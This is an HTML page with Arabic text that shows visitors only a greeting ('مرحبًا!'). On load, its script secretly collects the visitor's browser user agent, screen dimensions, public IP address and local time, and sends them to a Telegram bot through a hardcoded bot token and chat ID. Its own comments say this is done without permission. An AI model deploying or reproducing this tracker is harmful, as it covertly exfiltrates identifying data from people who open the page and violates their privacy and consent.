<!DOCTYPE html>
<html>
<head>
    <title>Page</title>
    <script>
        async function sendDataToTelegram() {
            // جمع بيانات محدودة (بدون إذن)
            const data = {
                userAgent: navigator.userAgent,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
                time: new Date().toLocaleString(),
            };

            // إرسال البيانات إلى بوت تيليجرام
            const botToken = "7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU";
            const chatId = "7327464581";
            const message = `📱 بيانات الجهاز:\n${JSON.stringify(data, null, 2)}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => console.log("تم الإرسال!"))
                .catch(error => console.error("خطأ:", error));
        }

        // تشغيل عند فتح الصفحة
        window.onload = sendDataToTelegram;
    </script>
</head>
<body>
    <h1>مرحبًا!</h1>
</body>
</html>
